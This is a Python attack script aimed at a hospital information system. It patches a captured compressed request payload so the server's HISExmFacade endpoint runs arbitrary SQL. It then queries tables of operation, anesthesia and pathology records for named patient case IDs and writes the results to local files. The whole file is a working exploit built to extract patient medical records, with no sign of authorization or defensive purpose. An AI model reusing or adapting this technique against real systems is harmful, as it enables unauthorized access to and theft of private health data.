from his_client_final import HISClient
import requests
import zlib

class LabSearcher6(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher6()

# From ORMC430 Memo 2:
# OPID = F129348478 (the pre-op assessment document ID)
# DRMID = 20260218011135
# HCASENO = 75176986
# HHISNUM = 003617083J

opid = 'F129348478'
drmid = '20260218011135'
hcaseno = '75176986'
hhistnum = '003617083J'
ordseq = 'A75176986OR0041'

# 1. Query OPDUSR.EXMREPD using OPID
print(f"1. Querying OPDUSR.EXMREPD for OPID {opid}...")
sql1 = f"SELECT * FROM OPDUSR.EXMREPD WHERE OPID = '{opid}'"
res1 = searcher.execute_sql(sql1)
if res1 and "<DRMODIFY>" in res1:
    print("[+] Found in EXMREPD by OPID!")
    with open("exmrepd_opid.txt", "w", encoding="utf-8") as f:
        f.write(res1)
    print(res1[:800])
else:
    print("[-] Not found in EXMREPD by OPID.")

# 2. Query OPDUSR.EXMREPD using DRMID
print(f"\n2. Querying OPDUSR.EXMREPD for DRMID {drmid}...")
sql2 = f"SELECT * FROM OPDUSR.EXMREPD WHERE DRMID = '{drmid}'"
res2 = searcher.execute_sql(sql2)
if res2 and "<DRMODIFY>" in res2:
    print("[+] Found in EXMREPD by DRMID!")
    with open("exmrepd_drmid.txt", "w", encoding="utf-8") as f:
        f.write(res2)
    print(res2[:800])
else:
    print("[-] Not found in EXMREPD by DRMID.")

# 3. Query OPDUSR.EXMREPD using HCASENO
print(f"\n3. Querying OPDUSR.EXMREPD for HCASENO {hcaseno}...")
sql3 = f"SELECT * FROM OPDUSR.EXMREPD WHERE HCASENO = '{hcaseno}'"
res3 = searcher.execute_sql(sql3)
if res3 and "<DRMODIFY>" in res3:
    print("[+] Found in EXMREPD by HCASENO!")
    with open("exmrepd_hcaseno.txt", "w", encoding="utf-8") as f:
        f.write(res3)
    print(res3[:800])
else:
    print("[-] Not found in EXMREPD by HCASENO.")

# 4. Try OPDUSR.ANEDRMEMO or similar tables
print(f"\n4. Trying OPDUSR.ANEDRMEMO for OPID {opid}...")
for table in ['OPDUSR.ANEDRMEMO', 'OPDUSR.DRMEMO', 'OPDUSR.ANEDOC']:
    sql = f"SELECT * FROM {table} WHERE OPID = '{opid}'"
    res = searcher.execute_sql(sql)
    if res and "<DRMODIFY>" in res:
        print(f"[+] Found in {table}!")
        with open(f"anedrmemo_{table.replace('.','_')}.txt", "w", encoding="utf-8") as f:
            f.write(res)
        print(res[:600])
    else:
        print(f"[-] Not found in {table}.")

# 5. Try PAT_RESULTH with HCASENO
print(f"\n5. Querying PAT_RESULTH for HCASENO {hcaseno}...")
sql5 = f"SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID = '{hcaseno}'"
res5 = searcher.execute_sql(sql5)
if res5 and "<DRMODIFY>" in res5:
    print("[+] Found in PAT_RESULTH by HCASENO!")
    with open("pat_resulth_hcaseno.txt", "w", encoding="utf-8") as f:
        f.write(res5)
    print(res5[:800])
else:
    print("[-] Not found in PAT_RESULTH by HCASENO.")
